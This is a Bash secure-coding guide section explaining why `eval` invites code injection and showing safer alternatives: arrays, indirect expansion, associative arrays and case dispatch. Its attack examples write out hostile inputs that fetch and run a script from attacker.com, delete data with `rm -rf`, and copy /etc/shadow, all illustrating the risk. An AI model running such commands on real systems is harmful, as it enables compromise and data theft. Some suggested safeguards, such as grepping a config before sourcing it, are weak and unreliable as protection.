## Eval Command

**Never use `eval` with untrusted input. Avoid `eval` entirely unless absolutely necessary—almost every use case has a safer alternative.**

**Rationale:**
- **Code Injection**: `eval` executes arbitrary code with full script privileges—complete system compromise if input is attacker-controlled
- **No Sandboxing**: Bypasses all validation; dynamic code construction makes security review nearly impossible
- **Better Alternatives Exist**: Arrays, indirect expansion, and associative arrays handle all common use cases safely

**Understanding eval:**

`eval` takes a string, performs all expansions, then executes the result—performing expansion TWICE:

```bash
var='$(whoami)'
eval "echo $var"  # First: echo $(whoami) �' Second: executes whoami!
```

**Attack Examples:**

```bash
# 1. Direct Command Injection - script does: eval "$user_input"
./script.sh 'curl https://attacker.com/backdoor.sh | bash'

# 2. Variable Name Injection - script does: eval "$var_name='$var_value'"
./script.sh 'x=$(rm -rf /important/data)' 'ignored'  # Command substitution executes!

# 3. Log Injection - eval used in logging
./script.sh 'login"; cat /etc/shadow > /tmp/pwned; echo "'
```

**Safe Alternative 1: Arrays for Command Construction**

```bash
# ✓ Correct - build command safely with array
build_find_command() {
  local -- search_path="$1"
  local -- file_pattern="$2"
  local -a cmd

  cmd=(find "$search_path" -type f -name "$file_pattern")
  "${cmd[@]}"  # Execute array safely - no injection possible
}
```

**Safe Alternative 2: Indirect Expansion for Variable References**

```bash
# ✗ Wrong - using eval
eval "value=\\$$var_name"

# ✓ Correct - indirect expansion
echo "${!var_name}"

# ✓ Correct - for assignment
printf -v "$var_name" '%s' "$value"
```

**Safe Alternative 3: Associative Arrays for Dynamic Data**

```bash
# ✗ Wrong - eval to create dynamic variables
for i in {1..5}; do
  eval "var_$i='value $i'"
done

# ✓ Correct - associative array
declare -A data
for i in {1..5}; do
  data["var_$i"]="value $i"
done
```

**Safe Alternative 4: Case/Arrays for Function Dispatch**

```bash
# ✗ Wrong - eval to select function
eval "${action}_function"

# ✓ Correct - case statement
case "$action" in
  start)   start_function ;;
  stop)    stop_function ;;
  *)       die 22 "Invalid action ${action@Q}" ;;
esac

# ✓ Also correct - array lookup
declare -A actions=([start]=start_function [stop]=stop_function)
if [[ -v "actions[$action]" ]]; then
  "${actions[$action]}"
fi
```

**Safe Alternative 5: Command Substitution for Output Capture**

```bash
# ✗ Wrong
eval "output=\$($cmd)"

# ✓ Correct - if command is in variable, use array
declare -a cmd=(ls -la /tmp)
output=$("${cmd[@]}")
```

**Safe Alternative 6: Validate Before Parsing**

```bash
# ✗ Wrong - eval for parsing
eval "$config_line"

# ✓ Correct - validate key before assignment
IFS='=' read -r key value <<< "$config_line"
if [[ "$key" =~ ^[A-Z_][A-Z0-9_]*$ ]]; then
  declare -g "$key=$value"
else
  die 22 "Invalid configuration key: $key"
fi
```

**Safe Alternative 7: Arithmetic Expansion**

```bash
# ✗ Wrong - eval for arithmetic
eval "result=$((user_expr))"

# ✓ Correct - validate first
if [[ "$user_expr" =~ ^[0-9+\\-*/\\ ()]+$ ]]; then
  result=$((user_expr))
fi

# ✓ Better - use bc for isolation
result=$(bc <<< "$user_expr")
```

**Edge Cases: When eval seems necessary**

```bash
# Dynamic variable names in loops - use associative array instead
declare -A service_status
for service in nginx apache mysql; do
  service_status["$service"]=$(systemctl is-active "$service")
done

# Building complex commands - use array instead
declare -a cmd=(find /data -type f)
[[ -n "$name_pattern" ]] && cmd+=(-name "$name_pattern")
"${cmd[@]}"

# Config sourcing - validate first
if grep -qE '(eval|exec|`|\$\()' config.txt; then
  die 1 'Config file contains dangerous patterns'
fi
source config.txt
```

**Anti-patterns:**

```bash
# ✗ Wrong - eval with user input | ✓ Correct - whitelist
eval "$user_command"            | case "$user_command" in start|stop) ... esac

# ✗ Wrong - eval assignment     | ✓ Correct - printf -v
eval "$var='$val'"              | printf -v "$var" '%s' "$val"

# ✗ Wrong - double expansion    | ✓ Correct - indirect expansion
eval "echo \$$var_name"         | echo "${!var_name}"

# ✗ Wrong - check if set        | ✓ Correct - -v test
eval "if [[ -n \\$$var ]]; ..."  | if [[ -v "$var" ]]; then ...
```

**Detecting eval usage:**

```bash
grep -rn 'eval.*\$' /path/to/scripts/  # Find dangerous eval with variables
shellcheck -x script.sh                 # SC2086 warns about eval misuse
```

**Key principle:** If you think you need `eval`, you're solving the wrong problem. Use arrays for commands, indirect expansion for variable references, associative arrays for dynamic data, and case statements for dispatch.
